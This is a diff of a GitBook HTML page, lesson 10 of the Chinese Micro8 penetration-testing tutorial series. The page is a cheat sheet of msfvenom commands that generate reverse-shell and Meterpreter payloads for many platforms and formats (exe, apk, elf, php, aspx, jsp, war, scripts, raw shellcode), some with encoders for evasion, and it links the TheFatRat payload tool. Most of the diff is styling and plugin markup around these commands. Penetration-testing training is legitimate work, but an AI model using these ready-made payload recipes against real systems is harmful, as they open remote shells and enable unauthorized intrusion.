@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第十课：msfvenom常用生成payload命令 · GitBook</title>
+        <title>第十课：msfvenom常用生成payload命令 · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="9_工具介绍-the-backdoor-factory.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,69 +1860,69 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
                                 
                                 <h3 id="windows">windows:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform Windows -p windows/meterpreter/reverse_tcp 
-LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-e</span> x86/shikata_ga_nai -b <span class="hljs-string">&apos;\x00\x0a\xff&apos;</span> -i 3 <span class="hljs-_">-f</span> exe -o payload.exe
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp 
+LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -e x86/shikata_ga_nai -b <span class="token string">&apos;\x00\x0a\xff&apos;</span> -i 3 -f exe -o payload.exe
 </code></pre>
 <h3 id="mac">mac:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> macho -o payload.macho
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f macho -o payload.macho
 </code></pre>
 <h3 id="android">android:</h3>
-<pre><code class="lang-bash">//&#x9700;&#x8981;&#x7B7E;&#x540D;
-msfvenom <span class="hljs-_">-a</span> x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> apk -o payload.apk
+<pre class="language-"><code class="lang-bash">//&#x9700;&#x8981;&#x7B7E;&#x540D;
+msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f apk -o payload.apk
 </code></pre>
 <h3 id="powershell">powershell:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-e</span> cmd/powershell_base64 -i 3 <span class="hljs-_">-f</span> raw -o payload.ps1
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
 </code></pre>
 <h3 id="linux">linux:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> elf -o payload.elf
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f elf -o payload.elf
 </code></pre>
 <h3 id="php">php:</h3>
-<pre><code class="lang-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; <span class="hljs-_">-f</span> raw &gt; shell.php
-cat shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&apos;&lt;?php &apos;</span> | tr <span class="hljs-_">-d</span> <span class="hljs-string">&apos;\n&apos;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+<pre class="language-"><code class="lang-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">&gt;</span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">&gt;</span> -f raw <span class="token operator">&gt;</span> shell.php
+<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">&apos;&lt;?php &apos;</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">&apos;\n&apos;</span> <span class="token operator">&gt;</span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">&gt;&gt;</span> shell.php
 </code></pre>
 <h3 id="aspx">aspx:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> aspx -o payload.aspx
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f aspx -o payload.aspx
 </code></pre>
 <h3 id="jsp">jsp:</h3>
-<pre><code class="lang-bash">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> raw -o payload.jsp
+<pre class="language-"><code class="lang-bash">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f raw -o payload.jsp
 </code></pre>
 <h3 id="war">war:</h3>
-<pre><code class="lang-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> raw - o payload.war
+<pre class="language-"><code class="lang-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f raw - o payload.war
 </code></pre>
 <h3 id="nodejs">nodejs:</h3>
-<pre><code class="lang-bash">msfvenom -p nodejs/shell_reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> raw -o payload.js
+<pre class="language-"><code class="lang-bash">msfvenom -p nodejs/shell_reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f raw -o payload.js
 </code></pre>
 <h3 id="python">python:</h3>
-<pre><code class="lang-bash">msfvenom -p python/meterpreter/reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> raw -o payload.py
+<pre class="language-"><code class="lang-bash">msfvenom -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f raw -o payload.py
 </code></pre>
 <h3 id="perl">perl:</h3>
-<pre><code class="lang-bash">msfvenom -p cmd/unix/reverse_perl LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> raw -o payload.pl
+<pre class="language-"><code class="lang-bash">msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f raw -o payload.pl
 </code></pre>
 <h3 id="ruby">ruby:</h3>
-<pre><code class="lang-bash">msfvenom -p ruby/shell_reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> raw -o payload.rb
+<pre class="language-"><code class="lang-bash">msfvenom -p ruby/shell_reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f raw -o payload.rb
 </code></pre>
 <h3 id="lua">lua:</h3>
-<pre><code class="lang-bash">msfvenom -p cmd/unix/reverse_lua LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> raw -o payload.lua
+<pre class="language-"><code class="lang-bash">msfvenom -p cmd/unix/reverse_lua LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f raw -o payload.lua
 </code></pre>
 <h3 id="windows-shellcode">windows shellcode:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> c
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f c
 </code></pre>
 <h3 id="linux-shellcode">linux shellcode:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> c
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f c
 </code></pre>
 <h3 id="mac-shellcode">mac shellcode:</h3>
-<pre><code class="lang-bash">msfvenom <span class="hljs-_">-a</span> x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=&#x653B;&#x51FB;&#x673A;IP LPORT=&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; <span class="hljs-_">-f</span> c
+<pre class="language-"><code class="lang-bash">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;IP LPORT<span class="token operator">=</span>&#x653B;&#x51FB;&#x673A;&#x7AEF;&#x53E3; -f c
 </code></pre>
 <h3 id="&#x4FBF;&#x6377;&#x5316;payload&#x751F;&#x6210;&#xFF1A;">&#x4FBF;&#x6377;&#x5316;payload&#x751F;&#x6210;&#xFF1A;</h3>
 <p>&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;
 <a href="https://github.com/Screetsec/TheFatRat" target="_blank">https://github.com/Screetsec/TheFatRat</a></p>
-<pre><code class="lang-bash">root@John:~/Desktop<span class="hljs-comment"># git clone https://github.com/Screetsec/TheFatRat.git</span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop<span class="token comment"># git clone https://github.com/Screetsec/TheFatRat.git</span>
 //&#x8BBE;&#x7F6E;&#x65F6;&#x9700;&#x8981;&#x6302;&#x5899;
 </code></pre>
 <p><img src="media/492800d0d4d9ed8b762c3494bc845363.jpg" alt="">  </p>
@@ -1889,36 +1931,38 @@ cat shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span 
 <p><img src="media/58459088b75ecdcc093e435a5a586638.jpg" alt="">  </p>
 <h3 id="&#x9644;&#x5F55;&#xFF1A;">&#x9644;&#x5F55;&#xFF1A;</h3>
 <p>&#x4E2D;&#x6587;&#x4F7F;&#x7528;&#x8BF4;&#x660E;&#xFF1A;</p>
-<pre><code class="lang-bash">Options:
+<pre class="language-"><code class="lang-bash">Options:
 
--p, --payload &lt;payload&gt; &#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;payload
+-p, --payload <span class="token operator">&lt;</span>payload<span class="token operator">&gt;</span> &#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;payload
 --payload-options &#x5217;&#x51FA;&#x8BE5;payload&#x53C2;&#x6570;
-<span class="hljs-_">-l</span>, --list [<span class="hljs-built_in">type</span>] &#x5217;&#x51FA;&#x6240;&#x6709;&#x7684;payloads
--n, --nopsled &lt;length&gt; &#x4E3A;payload&#x6307;&#x5B9A;&#x4E00;&#x4E2A; nopsled &#x957F;&#x5EA6;
-<span class="hljs-_">-f</span>, --format &lt;format&gt; &#x6307;&#x5B9A;payload&#x751F;&#x6210;&#x683C;&#x5F0F;
+-l, --list <span class="token punctuation">[</span>type<span class="token punctuation">]</span> &#x5217;&#x51FA;&#x6240;&#x6709;&#x7684;payloads
+-n, --nopsled <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> &#x4E3A;payload&#x6307;&#x5B9A;&#x4E00;&#x4E2A; nopsled &#x957F;&#x5EA6;
+-f, --format <span class="token operator">&lt;</span>format<span class="token operator">&gt;</span> &#x6307;&#x5B9A;payload&#x751F;&#x6210;&#x683C;&#x5F0F;
 --help-formats &#x67E5;&#x770B;&#x6240;&#x6709;&#x652F;&#x6301;&#x683C;&#x5F0F;
-<span class="hljs-_">-e</span>, --encoder &lt;encoder&gt; &#x4F7F;&#x7528;&#x7F16;&#x7801;&#x5668;
-<span class="hljs-_">-a</span>, --arch &lt;arch&gt; &#x6307;&#x5B9A;payload&#x6784;&#x67B6;
---platform &lt;platform&gt; &#x6307;&#x5B9A;payload&#x5E73;&#x53F0;
+-e, --encoder <span class="token operator">&lt;</span>encoder<span class="token operator">&gt;</span> &#x4F7F;&#x7528;&#x7F16;&#x7801;&#x5668;
+-a, --arch <span class="token operator">&lt;</span>arch<span class="token operator">&gt;</span> &#x6307;&#x5B9A;payload&#x6784;&#x67B6;
+--platform <span class="token operator">&lt;</span>platform<span class="token operator">&gt;</span> &#x6307;&#x5B9A;payload&#x5E73;&#x53F0;
 --help-platforms &#x663E;&#x793A;&#x652F;&#x6301;&#x7684;&#x5E73;&#x53F0;
-<span class="hljs-_">-s</span>, --space &lt;length&gt; &#x8BBE;&#x5B9A;payload&#x653B;&#x51FB;&#x8377;&#x8F7D;&#x7684;&#x6700;&#x5927;&#x957F;&#x5EA6;
---encoder-space &lt;length&gt; The maximum size of the encoded payload
+-s, --space <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> &#x8BBE;&#x5B9A;payload&#x653B;&#x51FB;&#x8377;&#x8F7D;&#x7684;&#x6700;&#x5927;&#x957F;&#x5EA6;
+--encoder-space <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> The maximum size of the encoded payload
 
-(defaults to the <span class="hljs-_">-s</span> value)
--b, --bad-chars &lt;list&gt; &#x6307;&#x5B9A;bad-chars &#x5982;: <span class="hljs-string">&apos;\x00\xff&apos;</span>
--i, --iterations &lt;count&gt; &#x6307;&#x5B9A;&#x7F16;&#x7801;&#x6B21;&#x6570;
--c, --add-code &lt;path&gt; &#x6307;&#x5B9A;&#x4E2A;win32 shellcode &#x6587;&#x4EF6;
--x, --template &lt;path&gt; &#x6307;&#x5B9A;&#x4E00;&#x4E2A; executable &#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x6A21;&#x677F;
+<span class="token punctuation">(</span>defaults to the -s value<span class="token punctuation">)</span>
+-b, --bad-chars <span class="token operator">&lt;</span>list<span class="token operator">&gt;</span> &#x6307;&#x5B9A;bad-chars &#x5982;: <span class="token string">&apos;\x00\xff&apos;</span>
+-i, --iterations <span class="token operator">&lt;</span>count<span class="token operator">&gt;</span> &#x6307;&#x5B9A;&#x7F16;&#x7801;&#x6B21;&#x6570;
+-c, --add-code <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> &#x6307;&#x5B9A;&#x4E2A;win32 shellcode &#x6587;&#x4EF6;
+-x, --template <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> &#x6307;&#x5B9A;&#x4E00;&#x4E2A; executable &#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x6A21;&#x677F;
 -k, --keep payload&#x81EA;&#x52A8;&#x5206;&#x79BB;&#x5E76;&#x6CE8;&#x5165;&#x5230;&#x65B0;&#x7684;&#x8FDB;&#x7A0B;
--o, --out &lt;path&gt; &#x5B58;&#x653E;&#x751F;&#x6210;&#x7684;payload
--v, --var-name &lt;name&gt; &#x6307;&#x5B9A;&#x81EA;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;
+-o, --out <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> &#x5B58;&#x653E;&#x751F;&#x6210;&#x7684;payload
+-v, --var-name <span class="token operator">&lt;</span>name<span class="token operator">&gt;</span> &#x6307;&#x5B9A;&#x81EA;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;
 --smallest Generate the smallest possible payload
 -h, --help &#x663E;&#x793A;&#x5E2E;&#x52A9;&#x6587;&#x4EF6;
 </code></pre>
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-23 15:18
+</span></footer>
                                 
                                 </section>
                             
@@ -1961,7 +2005,7 @@ cat shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span 
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第十课：msfvenom常用生成payload命令","level":"1.4.10","depth":2,"next":{"title":"第十一课：工具介绍Veil-Evasion","level":"1.4.11","depth":2,"path":"Chapter1/11_工具介绍Veil-Evasion.md","ref":"Chapter1/11_工具介绍Veil-Evasion.md","articles":[]},"previous":{"title":"第九课：工具介绍-the-backdoor-factory","level":"1.4.9","depth":2,"path":"Chapter1/9_工具介绍-the-backdoor-factory.md","ref":"Chapter1/9_工具介绍-the-backdoor-factory.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/10_msfvenom常用生成payload命令.md","mtime":"2019-02-23T07:18:30.824Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第十课：msfvenom常用生成payload命令","level":"1.4.10","depth":2,"next":{"title":"第十一课：工具介绍Veil-Evasion","level":"1.4.11","depth":2,"path":"Chapter1/11_工具介绍Veil-Evasion.md","ref":"Chapter1/11_工具介绍Veil-Evasion.md","articles":[]},"previous":{"title":"第九课：工具介绍-the-backdoor-factory","level":"1.4.9","depth":2,"path":"Chapter1/9_工具介绍-the-backdoor-factory.md","ref":"Chapter1/9_工具介绍-the-backdoor-factory.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/10_msfvenom常用生成payload命令.md","mtime":"2019-02-23T07:18:30.824Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1971,27 +2015,43 @@ cat shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span 
     <script src="../gitbook/theme.js"></script>
     
         
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
